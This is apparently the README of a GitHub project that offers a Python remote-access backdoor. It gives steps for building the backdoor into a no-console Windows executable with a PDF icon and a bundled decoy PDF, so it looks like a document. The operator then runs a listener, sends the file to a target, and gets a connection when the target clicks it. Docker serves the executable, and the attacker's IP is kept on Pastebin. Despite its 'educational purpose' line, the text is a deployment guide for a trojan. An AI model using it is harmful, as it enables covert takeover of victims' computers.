# This Backdoor dosen't bypass windows defender and other AV's

For educational Purpose only
Dosen't matter if target dosen't have pyhton installed

You should have these requirements :
1. Python installed with required packages 
2. Pyinstaller installed
3. Update ur current IP address in Pastebin.com
4. Must have docker installed if using it

## Steps :
1. do git clone https://github.com/Anonomous69/Backdoor
2. cd to directory
3. do C:\Users\username\Appdata\wherever\your\pyinstaller\is\there\pyintstaller.exe --add-data=sample.pdf:.  -—onefile -—noconsole --icon pdf.ico backdoor.py
4. The created backdoor must be in your "dist" folder in that directory
5. Run Listener is your machine and send the backdoor to target
6. when target clicks backdoor, u get the connection

## Docker :
for a proper web server (lacking in windows) to host the backdoor.exe file use docker
steps:
1. cd Docker
2. docker build -t Dcoker .
3. docker run Dcoker
and then go to <your_IP>:8080 in broser to download the ready-made .exe
